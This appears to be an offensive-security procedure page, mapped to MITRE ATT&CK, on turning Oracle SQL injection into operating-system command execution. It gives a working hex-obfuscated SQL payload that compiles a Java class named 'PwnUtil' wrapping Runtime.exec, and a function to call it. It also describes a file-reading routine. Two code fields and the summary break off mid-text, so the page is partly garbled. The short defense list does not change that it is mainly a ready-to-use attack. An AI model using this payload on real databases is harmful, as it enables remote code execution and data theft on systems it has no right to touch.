---
id: a6b6641a-2019-4681-9191-75d58b19fc6d
name: Oracle Java Class OS Command Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:35.345225+00:00'
updated_at: '2023-04-10T20:23:11.059242+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
tags:
- '[[Oracle Java Class]]'
- '[[Oracle SQL Command Execution]]'
- '[[Oracle SQL Injection]]'
---

# Oracle Java Class OS Command Execution

## Summary

This procedure involves creating and compiling a Java class with OS command execution and file reading capabilities, which can be used to execute arbitrary commands on the target system. This technique can be used in conjunction with Oracle SQL injection and command execution to gain remote code ex

## Description

# Description

This procedure involves creating and compiling a Java class with OS command execution and file reading capabilities, which can be used to execute arbitrary commands on the target system. This technique can be used in conjunction with Oracle SQL injection and command execution to gain remote code execution capabilities on the target system. From an offensive standpoint, this procedure can be used to gain access to sensitive data and execute malicious code on the target system. From a technical perspective, this procedure involves creating a Java class with the appropriate code to execute OS commands and read files from the target system. From a business perspective, this procedure highlights the importance of securing against SQL injection attacks and the need for secure coding practices.

 

## Requirements

1. Access to an Oracle SQL database

1. Ability to create and compile Java classes

1. Knowledge of Oracle SQL injection techniques

 

## Defense

1. Implement secure coding practices to prevent SQL injection vulnerabilities

1. Implement access controls to limit user privileges and prevent unauthorized access to sensitive data

1. Monitor system logs and network traffic for suspicious activity

 

## Objectives

1. Execute arbitrary OS commands on the target system

1. Read files from the target system

 

# Instructions

1. This command creates and compiles a Java class named 'PwnUtil' with two functions: 'runCmd' and 'readFile'. The 'runCmd' function executes an OS command passed as an argument and returns the output of the command as a string. The 'readFile' function reads the contents of a file passed as an argument and returns it as a string. The command also creates a PL/SQL function 'PwnUtilFunc' that calls the 'runCmd' function with a command passed as an argument. This function can be used to execute OS commands from within a SQL query.

 



**Code**: [[/* create Java class */
BEGIN
EXECUTE IMMEDIATE 'c]]



> The 'create or replace and compile java source' statement creates a Java source named 'PwnUtil' and compiles it. The Java source contains a class named 'PwnUtil' with two functions: 'runCmd' and 'readFile'. The 'runCmd' function executes an OS command passed as an argument using the 'Runtime.getRuntime().exec' method and returns the output of the command as a string. The 'readFile' function reads the contents of a file passed as an argument using the 'FileReader' class and returns it as a string. The 'create or replace function' statement creates a PL/SQL function named 'PwnUtilFunc' that calls the 'runCmd' function with a command passed as an argument. The function returns the output of the 'runCmd' function as a string. The 'SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;' statement executes the 'PwnUtilFunc' function with the 'ping -c 4 localhost' command passed as an argument and returns the output of the command as a string.

2. To create a Java class and run an OS command, execute the following SQL query in the database:

SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual

SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;

 



**Code**: [[/* create Java class */
SELECT TO_CHAR(dbms_xmlque]]



> The above command creates a Java class and runs an OS command. The first query creates a Java class using the execute immediate statement and the second query runs an OS command using the PwnUtilFunc function. The user can modify the Java class and OS command as per their requirement.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]

## Tags

- [[Oracle Java Class]]
- [[Oracle SQL Command Execution]]
- [[Oracle SQL Injection]]


